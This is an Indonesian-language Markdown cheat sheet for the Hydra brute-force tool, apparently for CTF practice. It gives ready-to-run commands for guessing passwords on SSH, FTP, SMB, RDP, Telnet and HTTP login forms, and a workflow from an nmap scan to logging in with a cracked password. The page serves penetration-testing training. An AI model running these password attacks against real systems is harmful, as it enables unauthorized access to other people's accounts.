# Hydra Cheat Sheet

Hydra adalah tool untuk melakukan login brute-force terhadap berbagai layanan seperti SSH, FTP, SMB, HTTP, RDP, dan lainnya. Dalam CTF, Hydra sering digunakan untuk menguji kredensial yang telah ditemukan atau diberikan oleh challenge.

> ⚠️ Gunakan hanya pada sistem yang Anda miliki izin untuk diuji (misalnya lab, CTF, atau lingkungan latihan).

---

# Instalasi

## Kali Linux

```bash
sudo apt install hydra
```

## Cek Versi

```bash
hydra -h
```

---

# Format Dasar

```bash
hydra -l username -P wordlist.txt SERVICE://IP
```

Keterangan:

- `-l` = satu username
- `-L` = daftar username
- `-p` = satu password
- `-P` = wordlist password

---

# SSH

## Satu User

```bash
hydra -l admin -P rockyou.txt ssh://10.10.10.10
```

## Banyak User

```bash
hydra -L users.txt -P rockyou.txt ssh://10.10.10.10
```

---

# FTP

```bash
hydra -l admin -P rockyou.txt ftp://10.10.10.10
```

---

# SMB

```bash
hydra -l administrator -P rockyou.txt smb://10.10.10.10
```

---

# RDP

```bash
hydra -l administrator -P rockyou.txt rdp://10.10.10.10
```

---

# Telnet

```bash
hydra -l admin -P rockyou.txt telnet://10.10.10.10
```

---

# HTTP Basic Authentication

```bash
hydra -l admin -P rockyou.txt http-get://10.10.10.10/protected
```

---

# HTTP POST Form

Format:

```bash
hydra -l USER -P PASSLIST IP http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"
```

Contoh:

```bash
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid password"
```

Keterangan:

- `^USER^` = placeholder username
- `^PASS^` = placeholder password
- `F=` = teks yang muncul jika login gagal

---

# HTTP GET Form

```bash
hydra -l admin -P rockyou.txt 10.10.10.10 http-get-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

---

# HTTPS Login Form

```bash
hydra -l admin -P rockyou.txt 10.10.10.10 https-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"
```

---

# Menentukan Port

## SSH Port Custom

```bash
hydra -l admin -P rockyou.txt -s 2222 ssh://10.10.10.10
```

## HTTP Port Custom

```bash
hydra -l admin -P rockyou.txt -s 8080 http-get://10.10.10.10
```

---

# Menampilkan Hasil Lebih Detail

```bash
hydra -V -l admin -P rockyou.txt ssh://10.10.10.10
```

Keterangan:

- `-V` = verbose

---

# Menambah Threads

```bash
hydra -t 16 -l admin -P rockyou.txt ssh://10.10.10.10
```

Keterangan:

- `-t` = jumlah thread

---

# Menyimpan Hasil

```bash
hydra -o result.txt -l admin -P rockyou.txt ssh://10.10.10.10
```

---

# Resume Scan

```bash
hydra -R
```

Hydra akan melanjutkan sesi yang terhenti.

---

# Wordlist Populer

## RockYou

```bash
/usr/share/wordlists/rockyou.txt
```

Ekstrak jika masih terkompres:

```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

---

# Workflow CTF

## 1. Scan Service

```bash
nmap -sV IP
```

Output:

```text
22/tcp open ssh
21/tcp open ftp
80/tcp open http
```

---

## 2. Cari Username

```bash
admin
root
administrator
user
guest
```

---

## 3. Jalankan Hydra

```bash
hydra -l admin -P rockyou.txt ssh://IP
```

---

## 4. Login Jika Password Ditemukan

```bash
ssh admin@IP
```

---

# Contoh Output

```text
[22][ssh] host: 10.10.10.10
login: admin
password: password123
```

---

# Checklist Hydra CTF

- [ ] Identifikasi service target
- [ ] Cari username valid
- [ ] Gunakan wordlist yang sesuai
- [ ] Jalankan Hydra
- [ ] Simpan hasil
- [ ] Verifikasi login

---

# Ringkasan Cepat

```bash
# SSH
hydra -l admin -P rockyou.txt ssh://IP

# FTP
hydra -l admin -P rockyou.txt ftp://IP

# SMB
hydra -l administrator -P rockyou.txt smb://IP

# RDP
hydra -l administrator -P rockyou.txt rdp://IP

# HTTP Basic Auth
hydra -l admin -P rockyou.txt http-get://IP/protected

# Verbose
hydra -V -l admin -P rockyou.txt ssh://IP

# Custom Port
hydra -s 2222 -l admin -P rockyou.txt ssh://IP
```

> Tips CTF: Sebelum menggunakan Hydra, cari username valid terlebih dahulu melalui enumerasi. Brute-force tanpa informasi tambahan sering lambat dan tidak efektif.